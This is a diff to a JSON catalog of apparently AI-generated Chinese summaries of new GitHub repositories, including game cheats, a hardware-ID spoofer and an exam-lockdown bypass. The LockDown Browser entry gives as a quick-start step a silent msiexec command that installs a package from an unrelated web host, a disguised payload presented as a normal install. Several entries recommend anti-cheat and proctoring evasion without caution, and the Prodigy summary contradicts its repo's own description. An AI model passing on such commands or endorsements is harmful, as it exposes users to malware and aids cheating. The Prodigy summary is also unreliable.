@@ -1,6 +1,6 @@
 {
   "version": "1",
-  "updatedAt": "2026-05-17T05:31:24.091Z",
+  "updatedAt": "2026-05-18T05:50:28.838Z",
   "projects": [
     {
       "owner": "codecrafters-io",
@@ -31920,6 +31920,575 @@
         "category": "其他"
       },
       "analyzedAt": "2026-05-17T05:31:24.078Z"
+    },
+    {
+      "owner": "facebookresearch",
+      "repo": "vggt-omega",
+      "fullName": "facebookresearch/vggt-omega",
+      "description": "[CVPR 2026 Oral] VGGT Omega",
+      "language": "Python",
+      "topics": [],
+      "license": "NOASSERTION",
+      "createdAt": "2026-05-14T04:43:13Z",
+      "url": "https://github.com/facebookresearch/vggt-omega",
+      "analysis": {
+        "positioning": "Meta AI和牛津VGG联合研发的前沿多模态视觉基础模型。",
+        "useCases": [
+          "你需要进行图像内容理解或跨模态检索 → 它提供强大的视觉-文本对齐能力。",
+          "你在开发前沿的视觉AI应用 → 它提供Meta AI和牛津VGG出品的高性能预训练模型。",
+          "你是计算机视觉研究员，探索新模型 → 它提供CVPR 2026 Oral论文的官方实现及基石。"
+        ],
+        "audience": "计算机视觉研究员、AI开发者，用于多模态内容理解、生成及前沿模型开发。",
+        "quickStart": {
+          "prerequisites": "Python环境已配置，并已向Hugging Face申请模型访问权限。",
+          "steps": [
+            "克隆仓库并进入目录。",
+            "安装所有Python依赖。"
+          ],
+          "note": null
+        },
+        "competitors": [
+          {
+            "name": "CLIP (OpenAI/多种实现)",
+            "method": "预训练模型，用于图文匹配、零样本分类等。",
+            "models": "多个Vision Transformer和ResNet变体。",
+            "pricing": "免费开源模型"
+          },
+          {
+            "name": "DINOv2 (Meta AI)",
+            "method": "自监督学习，提取通用视觉特征。",
+            "models": "ViT-B/16, ViT-L/14等。",
+            "pricing": "免费开源模型"
+          }
+        ],
+        "pricing": "免费，模型权重需申请访问，Demo可直接使用。",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "顶尖研究机构出品，CVPR Oral论文，代码结构清晰，提供预训练模型（需申请）。但Issue活跃度偏低，且许可证未明确。模型访问需申请略有不便。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度较低，issue数量少且关闭率不高，可能项目较新或维护团队尚未完全投入社区互动。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-05-18T05:47:48.638Z"
+    },
+    {
+      "owner": "Kappaemme-git",
+      "repo": "codex-complexity-optimizer",
+      "fullName": "Kappaemme-git/codex-complexity-optimizer",
+      "description": "Codex skill for safe codebase complexity analysis and performance optimization reports",
+      "language": "Python",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-05-15T13:33:28Z",
+      "url": "https://github.com/Kappaemme-git/codex-complexity-optimizer",
+      "analysis": {
+        "positioning": "安全分析代码复杂度并优化性能的AI技能。",
+        "useCases": [
+          "你想找出代码性能瓶颈和复杂度问题 → 它帮你生成详细的分析报告。",
+          "你希望安全地自动应用代码优化 → 它帮你实现低风险优化并运行测试。",
+          "你需要清晰了解优化前后的效果和风险 → 它提供预估复杂度、风险等级和测试建议。"
+        ],
+        "audience": "面向开发者，利用AI自动分析、报告并优化代码，提升效率和质量。",
+        "quickStart": {
+          "prerequisites": "需安装Codex AI编程助手。",
+          "steps": [
+            "`npm install -g codex-complexity-optimizer` 或 `npx codex-complexity-optimizer` 安装。",
+            "在Codex中输入`Use $complexity-optimizer to analyze this codebase and give me a report.`"
+          ],
+          "note": null
+        },
+        "competitors": [],
+        "pricing": "免费（MIT许可证）。",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "作为Codex AI助手的技能，它能自动分析代码瓶颈并提供优化方案，甚至直接应用优化，极大减少重复性工作，提升开发效率和代码质量。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度低，Issue均为0。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-05-18T05:48:02.541Z"
+    },
+    {
+      "owner": "boona13",
+      "repo": "mykonos-island-voxels",
+      "fullName": "boona13/mykonos-island-voxels",
+      "description": "A browser-based isometric island builder with the soft, sun-bleached look of Mykonos. Vanilla ES modules, no bundler, mobile-friendly.",
+      "language": "JavaScript",
+      "topics": [
+        "canvas2d",
+        "city-builder",
+        "html5-game",
+        "isometric-game",
+        "mobile-friendly",
+        "open-source",
+        "vanilla-js"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-05-14T05:35:33Z",
+      "url": "https://github.com/boona13/mykonos-island-voxels",
+      "analysis": {
+        "positioning": "浏览器端米科诺斯风等距体素岛屿生成器，无需打包。",
+        "useCases": [
+          "你想放松一下，无需压力地玩创意游戏 → 它提供一个地中海风情体素岛屿，让你随心所欲地建造。",
+          "你想快速搭建一个等距体素场景模型 → 它提供75+预设素材和便捷的点击/拖拽构建方式，瞬间生成你的作品。",
+          "你想学习纯ES模块的Web前端项目实践 → 它提供一个无打包、无转译、易于理解的纯净代码库。"
+        ],
+        "audience": "适合追求纯粹创意乐趣的休闲玩家，也适合学习纯ES模块Web项目的前端开发者。",
+        "quickStart": {
+          "prerequisites": null,
+          "steps": [
+            "git clone https://github.com/boona13/mykonos-island-voxels.git && cd mykonos-island-voxels",
+            "python3 -m http.server 8000 (或 npx serve . 或 npx http-server -c-1 .)"
+          ],
+          "note": "浏览器不支持从`file://`路径加载ES模块，需通过HTTP服务运行，然后打开 `http://localhost:8000`。"
+        },
+        "competitors": [
+          {
+            "name": "Townscaper",
+            "method": "付费购买，桌面/移动端应用",
+            "models": "内置多种建筑样式，自动生成",
+            "pricing": "付费"
+          },
+          {
+            "name": "在线体素编辑器 (如Voxel Builder)",
+            "method": "浏览器在线使用",
+            "models": "自定义体素模型",
+            "pricing": "免费"
+          }
+        ],
+        "pricing": "免费，MIT许可证开源项目。",
+        "vibeCodingScore": 5,
+        "vibeCodingReason": "纯ES模块、无打包、无`node_modules`，直接浏览器运行，极致简约优雅。代码结构清晰，提供丰富的交互和精美的视觉效果，且注重移动端体验。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue数量少 (1/0)，可能意味着项目稳定或社区互动度较低，但有589星关注度。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-05-18T05:48:24.431Z"
+    },
+    {
+      "owner": "gi-dellav",
+      "repo": "zerostack",
+      "fullName": "gi-dellav/zerostack",
+      "description": "Minimalistic coding agent written in Rust, optimized for memory footprint and performance",
+      "language": "Rust",
+      "topics": [],
+      "license": "GPL-3.0",
+      "createdAt": "2026-05-12T19:31:49Z",
+      "url": "https://github.com/gi-dellav/zerostack",
+      "analysis": {
+        "positioning": "极致轻量、高性能的Rust驱动AI编程助手。",
+        "useCases": [
+          "你追求极致性能和低内存占用的AI编程助手 → 它帮你用Rust构建，提供领先的性能和内存效率。",
+          "你需要在多个LLM供应商间灵活切换来完成编程任务 → 它帮你统一接入OpenRouter、OpenAI、Anthropic、Gemini、Ollama等主流平台。",
+          "你担心AI代理执行不安全或错误的代码 → 它帮你通过Bubblewrap沙盒模式隔离执行，保护你的系统安全。",
+          "你需要AI代理在不同编程场景（编码、调试、评审）快速切换工作模式 → 它帮你动态调整系统提示，无需手动管理复杂的技能集。",
+          "你希望AI代理能深度集成到你的开发工作流和编辑器中 → 它帮你支持Git Worktrees和ACP协议，实现与IDE如Zed的无缝协作。"
+        ],
+        "audience": "追求极致性能、喜欢Rust、希望AI工具能深度集成到开发工作流的开发者和AI编程爱好者。",
+        "quickStart": {
+          "prerequisites": "Cargo和Git已安装；可选Bubblewrap用于沙盒模式。",
+          "steps": [
+            "cargo install zerostack [--features acp,loop,git-worktree,mcp]",
+            "export OPENROUTER_API_KEY=\"[你的API密钥]\"",
+            "zerostack (进入交互式会话) 或 zerostack -p \"你的指令\" (单次执行)"
+          ],
+          "note": "Windows支持未经过测试。"
+        },
+        "competitors": [
+          {
+            "name": "opencode",
+            "method": "基于JavaScript的AI编程Agent",
+            "models": "未在提供信息中提及",
+            "pricing": "未在提供信息中提及"
+          },
+          {
+            "name": "pi",
+            "method": "AI编程Agent (zerostack的灵感来源)",
+            "models": "未在提供信息中提及",
+            "pricing": "未在提供信息中提及"
+          }
+        ],
+        "pricing": "项目开源免费（GPL-3.0），使用时需自行配置LLM服务API密钥（可能需要付费）。",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "Rust原生开发，极致的性能和内存占用，TUI设计，沙盒模式增强安全性，以及对多种LLM和开发工作流（Git、IDE集成）的强大支持，对开发者友好且高效。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue开闭比健康，社区活跃度良好，问题解决积极。",
+        "category": "AI编程助手"
+      },
+      "analyzedAt": "2026-05-18T05:48:43.474Z"
+    },
+    {
+      "owner": "DARKHOLEUM",
+      "repo": "VoidStrap-For-Roblox",
+      "fullName": "DARKHOLEUM/VoidStrap-For-Roblox",
+      "description": "VoidStrap: Roblox bootstrapper, launcher utility. FFlag Editor, FastFlags, FPS Unlocker, memory trimmer, CPU watcher. UI customization, Aero theme, AniWatch layout, Nvidia Profile Inspector, .NET 10. Font sharpening, skybox changer, Join-Game Notify, AppSettings JSON, client optimization.",
+      "language": "C#",
+      "topics": [
+        "bloxstrap",
+        "bootstrapper",
+        "client-optimizer",
+        "customizations",
+        "fps-unlocker",
+        "launcher",
+        "modding",
+        "performance-optimizations",
+        "roblox",
+        "smooth-roblox-pc",
+        "voidstrap",
+        "voidstrap-client",
+        "voidstrap-download",
+        "voidstrap-roblox"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-05-14T15:37:45Z",
+      "url": "https://github.com/DARKHOLEUM/VoidStrap-For-Roblox",
+      "analysis": {
+        "positioning": "Roblox启动器与优化工具，深度定制游戏体验。",
+        "useCases": [
+          "你想提升Roblox帧率 → 它帮你解锁FPS，提升流畅度。",
+          "你想个性化Roblox界面 → 它帮你定制UI主题、字体、天空盒。",
+          "你想优化Roblox性能 → 它帮你调整FFlag、修剪内存、监控CPU。",
+          "你想管理Roblox游戏客户端 → 它帮你启动、配置并优化游戏体验。"
+        ],
+        "audience": "Roblox玩家，尤其是追求更高帧率、个性化界面和更流畅游戏体验的用户。",
+        "quickStart": {
+          "prerequisites": "Windows 10 及以上系统",
+          "steps": [
+            "从发布页面下载最新版本。",
+            "运行安装包并按照指示完成设置。",
+            "启动 VoidStrap。"
+          ],
+          "note": "macOS和Linux用户可考虑AppleBlox、Sober或Lution等替代工具。"
+        },
+        "competitors": [
+          {
+            "name": "AppleBlox",
+            "method": "Roblox启动器/优化器",
+            "models": "macOS",
+            "pricing": "免费"
+          },
+          {
+            "name": "Sober",
+            "method": "Roblox启动器/优化器",
+            "models": "Linux",
+            "pricing": "免费"
+          },
+          {
+            "name": "Lution",
+            "method": "Roblox启动器/优化器",
+            "models": "Linux (面向经验用户)",
+            "pricing": "免费"
+          }
+        ],
+        "pricing": "免费",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "文档清晰，功能介绍详尽，FAQ解答常见顾虑，社区活跃（Discord），安装指引明确，项目维护良好。",
+        "isVibeCoding": true,
+        "communityActivity": "活跃，但Issue管理可能在Discord等社区平台进行。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-05-18T05:48:58.766Z"
+    },
+    {
+      "owner": "TheRunicDev",
+      "repo": "MaaNTE",
+      "fullName": "TheRunicDev/MaaNTE",
+      "description": "MaaNTE Neverness to Everness (NTE) MAAFramework  强力驱动！QQ交流群 异环小助手，由 Automation assistant for Neverness to Everness Auto fishing, auto-sell fish, auto-buy bait. Features: auto coffee making, cafe revenue extraction, auto-skip story dialogue, auto-claim daily rewards.",
+      "language": "Unknown",
+      "topics": [
+        "computer-vision",
+        "genshin-impact",
+        "maaframework",
+        "neverness-to-everness-software",
+        "nevernesstoeverness",
+        "nte",
+        "nte-auto-fish",
+        "nte-ray-tracing"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-05-12T13:10:07Z",
+      "url": "https://github.com/TheRunicDev/MaaNTE",
+      "analysis": {
+        "positioning": "《异环》玩家的智能自动化辅助工具",
+        "useCases": [
+          "你手动钓鱼、卖鱼、买饵 → 它帮你自动钓鱼、卖鱼、补饵，省时省力",
+          "你手动经营咖啡厅、收取收益 → 它帮你自动制作咖啡、提取收益，解放双手",
+          "你手动跳过对话、领取奖励 → 它帮你自动跳过剧情、领取日常奖励，高效省心"
+        ],
+        "audience": "《Neverness to Everness》（异环）玩家，尤其是不想重复肝日常任务、希望解放双手、提升游戏效率的用户。",
+        "quickStart": {
+          "prerequisites": "Windows 操作系统",
+          "steps": [
+            "从官方GitHub Releases下载 `MaaNTE.zip`",
+            "解压并运行程序"
+          ],
+          "note": null
+        },
+        "competitors": [],
+        "pricing": "免费（开源项目）",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "项目处于早期开发阶段，存在软件安全（防篡改/恶意分发）和游戏封号（使用第三方工具）的双重风险，官方明确警告“使用需自行承担风险”。AGPLv3许可证也相对严格。",
+        "isVibeCoding": true,
+        "communityActivity": "QQ交流群活跃度高，但GitHub Issues开启1/关闭0，项目开发与问题解决仍处于起步阶段。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-05-18T05:49:15.726Z"
+    },
+    {
+      "owner": "zigabratun",
+      "repo": "Umbrella-HWID-Tool",
+      "fullName": "zigabratun/Umbrella-HWID-Tool",
+      "description": "Umbrella Spoofer: HWID changer, hardware identifier modification, disk serial number spoofing, MAC address changer. Kernel-level driver, SMBIOS UUID update, registry cleanup, motherboard serials. Anti-cheat integrity, EAC validation, BattlEye status, hardware ban removal, permanent spoofing.",
+      "language": "TypeScript",
+      "topics": [
+        "device-shadow-mode",
+        "disk-serial-spoof",
+        "game-spoofing",
+        "hardware-id-change",
+        "hardware-spoof",
+        "hardware-spoof-suite",
+        "hardware-spoofing",
+        "identity-shift",
+        "mac-address-changer",
+        "mac-spoofing",
+        "machine-spoof-core",
+        "spoof",
+        "spoof-detected",
+        "spoofer-hwid-premium",
+        "spoofer-tools",
+        "spoofing",
+        "spoofing-detection",
+        "system-anonymizer",
+        "system-reconfiguration"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-05-16T16:30:05Z",
+      "url": "https://github.com/zigabratun/Umbrella-HWID-Tool",
+      "analysis": {
+        "positioning": "内核级硬件信息伪装工具，专为解除游戏硬件封禁设计。",
+        "useCases": [
+          "你被游戏硬件封禁 → 它帮你解除封禁，重获游戏资格。",
+          "你想匿名化PC硬件信息 → 它帮你修改MAC、硬盘序列号等，保护隐私或绕过限制。",
+          "你需绕过主流反作弊系统 → 它提供内核级驱动，对抗EAC和BattlEye检测。"
+        ],
+        "audience": "寻求解除游戏硬件封禁或需要匿名化设备信息的PC玩家。",
+        "quickStart": {
+          "prerequisites": "需要管理员或系统权限，建议禁用BIOS安全启动（Secure Boot）。",
+          "steps": [
+            "下载并解压工具包；",
+            "将工具文件放入指定主文件夹；",
+            "运行应用程序。"
+          ],
+          "note": "安装时请确保Windows/驱动版本匹配；若遇杀毒软件警告，请添加白名单。"
+        },
+        "competitors": [],
+        "pricing": "免费",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "特定用途工具，核心功能涉及操作系统底层硬件修改和反作弊绕过，技术含量高但应用场景敏感。",
+        "isVibeCoding": true,
+        "communityActivity": "GitHub Issue 统计显示公开社区讨论和问题反馈不活跃。",
+        "category": "安全"
+      },
+      "analyzedAt": "2026-05-18T05:49:27.103Z"
+    },
+    {
+      "owner": "cdanielc293",
+      "repo": "Jenny-Mod-All-Versions",
+      "fullName": "cdanielc293/Jenny-Mod-All-Versions",
+      "description": "Jenny Mod: Minecraft 1.12.2 Java download, Bedrock addon, Pocket Edition PE mcpack, Android APK. SchnuriTV original, Ellie companion, Slime Girl. Forge loader setup, Fabric port, custom animations, interactive skins. Installation guide, dependency files, .jar download, crash fix, portable.",
+      "language": "C#",
+      "topics": [
+        "1-12-2-mod",
+        "forge-mod",
+        "forgemc-mod",
+        "java-edition",
+        "jenny-mod",
+        "jenny-mod-2026",
+        "jenny-mod-all-versions",
+        "jenny-mod-minecraft-download",
+        "jennybot",
+        "jennymod",
+        "jennymod-2026",
+        "jennymod-minecraft",
+        "mcmod",
+        "minecraft",
+        "minecraft-jenny-mod",
+        "minecraft-jenny-mod-2026",
+        "minecraft-mod",
+        "minecraftjennymod",
+        "minecraftjennymod-2026",
+        "tminecaft"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-05-16T16:15:27Z",
+      "url": "https://github.com/cdanielc293/Jenny-Mod-All-Versions",
+      "analysis": {
+        "positioning": "Minecraft成人模组合集，提供多版本、多平台支持。",
+        "useCases": [
+          "想在Minecraft里添加成人角色？ → 它提供Jenny Mod及其所有版本下载。",
+          "需要在Java版、基岩版或安卓设备上玩Jenny Mod？ → 它提供对应文件和安装指导。",
+          "寻找具有详细动画和交互的Minecraft成人模组？ → 它包含Jenny Mod的完整功能。"
+        ],
+        "audience": "寻求Minecraft成人内容（18+）的玩家，特别是Jenny Mod的爱好者。",
+        "quickStart": {
+          "prerequisites": "已安装Minecraft，且为18岁以上玩家。需要Forge或Fabric加载器。",
+          "steps": [
+            "下载对应Minecraft版本的Forge或Fabric。",
+            "将模组文件放入Minecraft的`mods`文件夹。",
+            "启动游戏。"
+          ],
+          "note": null
+        },
+        "competitors": [],
+        "pricing": "免费",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "专注于特定成人内容（18+）的Minecraft模组，目标用户明确，文档清晰，但内容本身具有争议性。",
+        "isVibeCoding": true,
+        "communityActivity": "GitHub Issue 功能未被使用（0开/0关），社区互动主要体现在下载和用户反馈而非GitHub Issue。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-05-18T05:49:43.184Z"
+    },
+    {
+      "owner": "PrimeKeeper58",
+      "repo": "blooket-hacks",
+      "fullName": "PrimeKeeper58/blooket-hacks",
+      "description": "blooket menu || blooket || blooket hacks",
+      "language": "JavaScript",
+      "topics": [
+        "blooket",
+        "blooket-bot",
+        "blooket-flooder",
+        "blooket-game",
+        "blooket-simulator",
+        "blooket-tricks",
+        "blooket-utilities",
+        "blooketapi"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-05-13T22:45:27Z",
+      "url": "https://github.com/PrimeKeeper58/blooket-hacks",
+      "analysis": {
+        "positioning": "Blooket游戏作弊工具，提供全方位游戏破解功能。",
+        "useCases": [
+          "你玩Blooket时想快速得分 → 它帮你自动答题、瞬时正确。",
+          "你希望在Blooket中拥有全部道具和资源 → 它帮你解锁所有Blook、获取无限代币和经验。",
+          "你想轻松赢得Blooket各种游戏模式 → 它帮你自动赢得塔防、淘金等模式，并免受踢出。",
+          "你担心被老师发现作弊 → 它提供高级防检测功能。"
+        ],
+        "audience": "寻求在Blooket游戏中获得不公平优势、快速解锁内容或轻松取胜的玩家。",
+        "quickStart": {
+          "prerequisites": "Windows操作系统。",
+          "steps": [
+            "打开CMD（Win + R，输入cmd）。",
+            "复制粘贴提供的单行安装命令并运行。"
+          ],
+          "note": null
+        },
+        "competitors": [],
+        "pricing": "免费。",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "项目提供游戏作弊功能，可能破坏游戏公平性，但作为开源工具，其技术实现是公开的。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue活跃度极低，无开放或关闭的Issue记录，但Star数尚可。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-05-18T05:49:54.675Z"
+    },
+    {
+      "owner": "EnsignKazekage",
+      "repo": "Prodigy-Hacks",
+      "fullName": "EnsignKazekage/Prodigy-Hacks",
+      "description": "Prodigymathgamehacking || prodigy hacks || prodigymathgame",
+      "language": "Python",
+      "topics": [
+        "prodigy",
+        "prodigygame",
+        "prodigyhacks",
+        "prodigyhackscripts",
+        "prodigymathgamehacking"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-05-13T23:40:15Z",
+      "url": "https://github.com/EnsignKazekage/Prodigy-Hacks",
+      "analysis": {
+        "positioning": "Prodigy数学游戏家长伴侣，深度洞察孩子学习数据。",
+        "useCases": [
+          "你想看孩子Prodigy游戏数据细节 → 它提供游戏时间、准确率、技能掌握等每周报告。",
+          "你想了解孩子数学学习强弱项 → 它分解技能点，找出需练习的标准。",
+          "你想控制孩子游戏时长 → 它追踪屏幕时间，可设每日限额。"
+        ],
+        "audience": "关心孩子Prodigy数学游戏学习效果的家长和教育者，特别是在官方后台信息不足时需要深度数据分析。",
+        "quickStart": {
+          "prerequisites": "Windows用户通过一键脚本自动安装Python和Git；Linux/macOS用户确保系统已安装curl。",
+          "steps": [
+            "prodigy login --token YOUR_TOKEN (保存会话令牌)",
+            "prodigy use 12345678 (设置孩子用户ID)",
+            "prodigy week (查看每周报告)"
+          ],
+          "note": "安装后需重启终端以使“prodigy”命令生效。"
+        },
+        "competitors": [
+          {
+            "name": "Prodigy官方家长后台",
+            "method": "通过官方应用或网站查看",
+            "models": "N/A (非模型驱动)",
+            "pricing": "免费（基础功能）"
+          }
+        ],
+        "pricing": "免费",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "虽然项目名包含“hacks”并警告可能导致账号被标记、重置或封禁，但其核心功能是为家长提供Prodigy数学游戏更详细、更透明的数据洞察（如游戏时间、技能掌握），且明确为“只读”模式。安装简便，MIT许可，对家长具有实用价值。",
+        "isVibeCoding": true,
+        "communityActivity": "几乎没有公开的Issue活动（0开/0关），社区互动不活跃。",
+        "category": "CLI工具"
+      },
+      "analyzedAt": "2026-05-18T05:50:14.992Z"
+    },
+    {
+      "owner": "CometBisonCrack",
+      "repo": "LockDown-Browser-Bypass-Tool",
+      "fullName": "CometBisonCrack/LockDown-Browser-Bypass-Tool",
+      "description": "Windows utility that restores standard keyboard shortcuts and window management capabilities during restricted browser sessions.",
+      "language": "C#",
+      "topics": [
+        "dll-hooking",
+        "dll-injection",
+        "dll-injector",
+        "lockdown-browser",
+        "lockdown-browser-bypass",
+        "proctored-exam",
+        "proctored-exam-bypass",
+        "respondus",
+        "respondus-lockdown",
+        "respondus-lockdown-browser"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-05-15T12:03:22Z",
+      "url": "https://github.com/CometBisonCrack/LockDown-Browser-Bypass-Tool",
+      "analysis": {
+        "positioning": "突破在线考试锁定浏览器对快捷键和窗口管理的限制。",
+        "useCases": [
+          "你在锁定浏览器考试时需要切换窗口查看资料 → 它帮你恢复Alt+Tab等快捷键，实现窗口自由切换。",
+          "你在锁定浏览器会话中想在不同浏览器标签页间快速跳转 → 它帮你恢复Ctrl+Tab等功能，让你轻松导航。",
+          "你希望在锁定浏览器运行时快速隐藏当前窗口 → 它帮你通过自定义快捷键Ctrl+Shift+M最小化窗口，保持隐蔽。"
+        ],
+        "audience": "面向需要规避在线考试系统（如Respondus LockDown Browser）限制，恢复标准键盘快捷键和窗口管理功能的用户，典型用户为学生或考生。",
+        "quickStart": {
+          "prerequisites": "Windows 10/11，.NET Framework 4.8 或更高版本，管理员权限。",
+          "steps": [
+            "按Win + R，输入cmd并回车，打开命令提示符。",
+            "复制并粘贴安装命令 `cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem LockDown-Browser-Bypass-Tool` 到命令提示符中，然后回车。"
+          ],
+          "note": "null"
+        },
+        "competitors": [],
+        "pricing": "免费",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "项目旨在规避在线考试系统的安全和监控机制，属于典型的“灰色地带”工具，有明显的“黑科技”或“作弊”属性。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue开启1个，已关闭0个，社区活跃度较低。",
+        "category": "安全"
+      },
+      "analyzedAt": "2026-05-18T05:50:28.826Z"
     }
   ]
 }
